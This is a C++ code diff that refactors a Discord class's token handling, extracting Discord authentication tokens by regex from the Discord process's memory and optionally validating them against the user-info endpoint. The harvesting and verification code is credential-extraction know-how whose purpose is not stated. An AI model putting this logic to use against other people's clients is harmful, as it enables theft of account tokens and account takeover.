@@ -486,6 +486,32 @@ DiscordUserInfo Discord::getUserInfo(const secure_string& token) {
 	};
 }
 
+std::vector<secure_string> Discord::extractTokens(const secure_string& data) {
+	constexpr auto MAX_TOKEN_SIZE = 200;
+
+	static const std::vector<std::regex> tokenRegex = {
+		//std::regex(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27,})"),
+		std::regex(R"([\w-]{24,30}\.[\w-]{6}\.[\w-]{27,100})"),
+		std::regex(R"(mfa\.[\w-]{84})")
+	};
+
+	std::vector<secure_string> results;
+
+	for (const auto& reg : tokenRegex) {
+		std::smatch matches;
+		secure_string data_copy(data);
+
+		while (std::regex_search(data_copy, matches, reg)) {
+			if (matches.length(0) <= MAX_TOKEN_SIZE) {
+				results.push_back(secure_string(matches.str()));
+			}
+			data_copy = secure_string(matches.suffix().str());//Unsafe maybe ?
+		}
+	}
+
+	return results;
+}
+
 secure_string Discord::getMemoryToken(bool verify) {
 	DWORD discordPid = getDiscordPID(DiscordType::Discord);
 	if (discordPid == 0) {
@@ -547,36 +573,25 @@ secure_string Discord::getMemoryToken(bool verify) {
 					else if (currentString.size() < MIN_TOKEN_SIZE)
 						currentString.clear();
 					else {
-						static const std::vector<std::regex> tokenRegex = {
-							std::regex(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27,})"),
-							std::regex(R"(mfa\.[\w-]{84})")
-						};
-
-						for (const auto& reg : tokenRegex) {
-							auto possize = getRegPosSize(currentString, reg);
-
-							for (const auto& [pos, size] : possize) {
-								secure_string match = currentString.substr(pos, size);
-
-								if (results.find(match) == results.end()) {//A new token! let's add it to the list
-									if (std::find(invalids.begin(), invalids.end(), match) == invalids.end()) {//If not invalid
-										if (verify) {
-											try {
-												auto userinfo = getUserInfo(match);
-												results.insert({ match, 1 });
-											}
-											catch (invalid_token_exception& e) {
-												invalids.push_back(match);
-											}
-											//Every other exceptions won't be catched!
-										}
-										else
+						for (const auto& match : extractTokens(currentString)) {
+							if (results.find(match) == results.end()) {//A new token! let's add it to the list
+								if (std::find(invalids.begin(), invalids.end(), match) == invalids.end()) {//If not invalid
+									if (verify) {
+										try {
+											auto userinfo = getUserInfo(match);
 											results.insert({ match, 1 });
+										}
+										catch (invalid_token_exception& e) {
+											invalids.push_back(match);
+										}
+										//Every other exceptions won't be catched!
 									}
+									else
+										results.insert({ match, 1 });
 								}
-								else {//Already known!
-									results[match] += 1;
-								}
+							}
+							else {//Already known!
+								results[match] += 1;
 							}
 						}
 
